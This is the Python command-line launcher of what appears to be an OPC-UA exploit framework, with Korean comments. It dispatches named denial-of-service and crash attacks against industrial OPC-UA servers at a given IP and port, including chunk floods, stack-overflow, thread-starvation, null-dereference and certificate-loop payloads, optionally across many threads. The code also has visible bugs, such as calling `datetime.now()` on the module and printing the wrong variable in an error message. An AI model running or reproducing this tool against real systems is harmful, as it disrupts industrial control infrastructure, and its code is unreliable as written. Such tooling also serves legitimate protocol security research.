import os
import socket
import struct
import time
import datetime
import sys
import _thread

from protocol import *  # `protocol` 모듈에서 불러온 모든 함수와 클래스를 사용
from config import *    # `config` 모듈에서 불러온 모든 설정값을 사용

# 다양한 페이로드 파일에서 필요한 함수들을 임포트
import payloads.sanity.sanity_read_nodes as sanity_read_nodes  # 노드를 읽는 공격 페이로드
import payloads.sanity.sanity_translate_browse_path as sanity_translate_browse_path  # 경로 변환 공격
import payloads.sanity.sanity_diagnostic_info as sanity_diagnostic_info  # 서버 진단 정보 공격
import payloads.sanity.sanity_get_node_id_info as sanity_get_node_id_info  # 노드 ID 정보를 가져오는 공격
import payloads.corpus.opcua_message_file as opcua_message_file  # OPC-UA 메시지를 파일로 처리
import payloads.corpus.opcua_message_boofuzz_db as opcua_message_boofuzz_db  # Boofuzz DB로 공격
import payloads.corpus.attack_file_nodejs_opcua_v8_oom as attack_file_nodejs_opcua_v8_oom  # Node.js OOM 공격
import payloads.corpus.attack_file_ASNeG_OpcUaStack_unhandled_exception as attack_file_ASNeG_OpcUaStack_unhandled_exception  # OpcUaStack 예외 공격
import payloads.attacks.chunk_flood as chunk_flood  # 청크 오버로드 공격
import payloads.attacks.open_multiple_secure_channels as open_multiple_secure_channels  # 다중 보안 채널 열기 공격
import payloads.attacks.close_session_with_old_timestamp as close_session_with_old_timestamp  # 타임스탬프 세션 종료 공격
import payloads.attacks.complex_nested_message as complex_nested_message  # 중첩 메시지 공격
import payloads.attacks.translate_browse_path_call_stack_overflow as translate_browse_path_call_stack_overflow  # 스택 오버플로우 공격
import payloads.attacks.thread_pool_wait_starvation as thread_pool_wait_starvation  # 쓰레드 풀 고갈 공격
import payloads.attacks.unlimited_persistent_subscriptions as unlimited_persistent_subscriptions  # 무한 구독 공격
import payloads.attacks.function_call_null_deref as function_call_null_deref  # 널 참조 공격
import payloads.attacks.malformed_utf8 as malformed_utf8  # 잘못된 UTF-8 공격
import payloads.attacks.race_change_and_browse_address_space as race_change_and_browse_address_space  # 주소 공간 변조 공격
import payloads.attacks.certificate_inf_chain_loop as certificate_inf_chain_loop  # 인증서 무한 체인 루프 공격
import payloads.attacks.unlimited_condition_refresh as unlimited_condition_refresh  # 무제한 조건 새로고침 공격

# start_threads_func: 주어진 함수를 여러 쓰레드에서 실행시키는 함수
def start_threads_func(func, count, sleep_between=1, params=None):
    for i in range(count):
        print("[-] Starting thread {} out of {} total threads".format(i, count))
        _thread.start_new_thread(func, params)  # 주어진 함수를 새로운 쓰레드로 실행
        if sleep_between:
            time.sleep(sleep_between)
    time.sleep(10000000)  # 메인 쓰레드를 유지하기 위한 sleep

# 주요 함수 및 공격 페이로드 맵핑
OPCUA_DIR = "opcua_dir"
OPCUA_FILE = "opcua_file"
OPCUA_THREADS_FUNC = "threads_run"
OPCUA_BOOFUZZ_PAYLOAD = "boofuzz_db"

DICT_FUNCS = {
    # 쓰레드에서 함수 실행
    OPCUA_THREADS_FUNC: start_threads_func,

    # Sanity 공격 페이로드
    "sanity": sanity_read_nodes.attack,
    "sanity_read_nodes": sanity_read_nodes.attack,
    "sanity_translate_browse_path": sanity_translate_browse_path.attack,
    "sanity_read_diag_info": sanity_diagnostic_info.attack,
    "sanity_get_node_id_info": sanity_get_node_id_info.attack,

    # 파일 및 디렉토리로 메시지 전송
    OPCUA_DIR: opcua_message_file.attack_dir,
    OPCUA_FILE: opcua_message_file.attack_file,
    OPCUA_BOOFUZZ_PAYLOAD: opcua_message_boofuzz_db.attack_boofuzz_payload,
    "attack_file_nodejs_opcua_v8_oom": attack_file_nodejs_opcua_v8_oom.attack,
    "attack_file_ASNeG_OpcUaStack_unhandled_exception": attack_file_ASNeG_OpcUaStack_unhandled_exception.attack,

    # 다양한 공격 페이로드
    "chunk_flood": chunk_flood.attack,
    "open_multiple_secure_channels": open_multiple_secure_channels.attack,
    "close_session_with_old_timestamp": close_session_with_old_timestamp.attack,
    "complex_nested_message": complex_nested_message.attack,
    "translate_browse_path_call_stack_overflow": translate_browse_path_call_stack_overflow.attack,
    "thread_pool_wait_starvation": thread_pool_wait_starvation.attack,
    "unlimited_persistent_subscriptions": unlimited_persistent_subscriptions.attack,
    "function_call_null_deref": function_call_null_deref.attack,
    "malformed_utf8": malformed_utf8.attack,
    "race_change_and_browse_address_space": race_change_and_browse_address_space.attack,
    "certificate_inf_chain_loop": certificate_inf_chain_loop.attack,
    "unlimited_condition_refresh": unlimited_condition_refresh.attack,
}

# 사용 방법을 출력하는 함수
def print_help():
    print("Help menu")
    print("[-] Usage: python3 main.py SERVER_TYPE IP_ADDR PORT ENDPOINT_ADDRESS FUNC_TYPE [DIR]")
    print("[-] Example: python3 main.py prosys 1.2.3.4 53530 /OPCUA/SimulationServer sanity")
    print("[-] Example: python3 main.py prosys 1.2.3.4 53530 /OPCUA/SimulationServer {} PATH_TO_DIR_WITH_CORPUS".format(OPCUA_DIR))
    print("[-] Example: python3 main.py prosys 1.2.3.4 53530 /OPCUA/SimulationServer {} FILE_PATH NUM_REQUESTS".format(OPCUA_FILE))
    print("[-] Example: python3 main.py prosys 1.2.3.4 53530 /OPCUA/SimulationServer {} FUNC_NAME COUNT".format(OPCUA_THREADS_FUNC))
    print("[-] Server types: {}".format(SERVERS_TYPE_NAME))
    print("[-] Function types: {}".format(list(DICT_FUNCS.keys())))
    exit()

# 메인 함수, 사용자가 입력한 인자에 따라 적절한 공격을 수행
def main():
    if len(sys.argv) < 6:
        print_help()

    python_path, server_type, ip_addr, port, endpoint_address, func_type = sys.argv[0:6]
    dir_corpus = None

    if server_type not in SERVERS_TYPE_NAME or\
        func_type not in DICT_FUNCS.keys() or\
        not port.isnumeric():
        print_help()

    # 디렉토리 공격 설정
    if func_type == OPCUA_DIR:
        if len(sys.argv) != 7:
            print_help()
        else:
            dir_corpus = sys.argv[6]
            if not os.path.isdir(dir_corpus):
                print("'{}' is not a valid dir!".format(dir_corpus))
                print_help()

    # 파일 공격 설정
    if func_type == OPCUA_FILE:
        if len(sys.argv) < 7:
            print_help()
        else:
            filepath_corpus = sys.argv[6]
            if len(sys.argv) == 8:
                req_count = int(sys.argv[7])
            else:
                req_count = 1
            if not os.path.isfile(filepath_corpus):
                print("'{}' is not a valid dir!".format(dir_corpus))
                print_help()

    # 쓰레드 실행 함수 설정
    if func_type == OPCUA_THREADS_FUNC:
        if len(sys.argv) != 8:
            print_help()
        else:
            func_name = sys.argv[6]
            func_call_count = int(sys.argv[7])
            if func_name not in DICT_FUNCS:
                print("'{}' is not a valid func!".format(func_name))
                print_help()

    # Boofuzz 공격 설정
    if func_type == OPCUA_BOOFUZZ_PAYLOAD:
        if len(sys.argv) < 6:
            print_help()
        else:
            if len(sys.argv) == 7:
                db_file_path = sys.argv[6]
                if not os.path.isfile(db_file_path):
                    print(f"'{db_file_path}' is not a valid boofuzz db file!")
                    print_help()
            else:
                db_file_path = "payloads/corpus/examples/corpus_example_boofuzz.db"

    # 서버 설정 및 공격 수행
    port = int(port)
    server_details = (server_type, ip_addr, port, endpoint_address)
    print("**** Started at {} ****".format(datetime.now()))
    
    started_time = time.time()
    
    # 디렉토리 내 파일을 OPCUA 메시지로 전송
    if func_type == OPCUA_DIR:
        DICT_FUNCS[func_type](server_details, dir_corpus)
    # 단일 파일을 OPCUA 메시지로 전송
    elif func_type == OPCUA_FILE:
        DICT_FUNCS[func_type](server_details, filepath_corpus, req_count)
    
    # 쓰레드를 사용하여 함수 실행
    elif func_type == OPCUA_THREADS_FUNC:
        start_threads_func(func=DICT_FUNCS[func_name], count=func_call_count, sleep_between=0.5, params=(server_details,))
    
    # Boofuzz 데이터베이스를 사용한 공격 실행
    elif func_type == OPCUA_BOOFUZZ_PAYLOAD:
        DICT_FUNCS[func_type](server_details, db_file_path)
    
    # 나머지 공격 실행 (다양한 공격 함수 호출)
    else:
        DICT_FUNCS[func_type](server_details)

    ended_time = time.time()  # 공격이 끝난 시점의 시간을 기록
    print("**** Ended at {} (took {:.2f} seconds) ****".format(datetime.now(), ended_time - started_time))

if __name__ == "__main__":
    main()
